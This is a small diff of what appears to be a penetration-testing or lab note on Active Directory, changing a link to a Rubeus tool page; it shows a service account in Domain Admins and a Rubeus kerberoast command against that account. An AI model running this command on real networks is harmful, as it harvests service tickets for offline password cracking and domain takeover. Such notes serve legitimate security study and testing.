@@ -29,7 +29,7 @@ samaccountname memberof
 mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
 ```
 
-Perform [[Kerberoasting]] with [[../../../tools/Rubeus]]
+Perform [[Kerberoasting]] with [[rubeus]]
 
 ```powershell-session
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
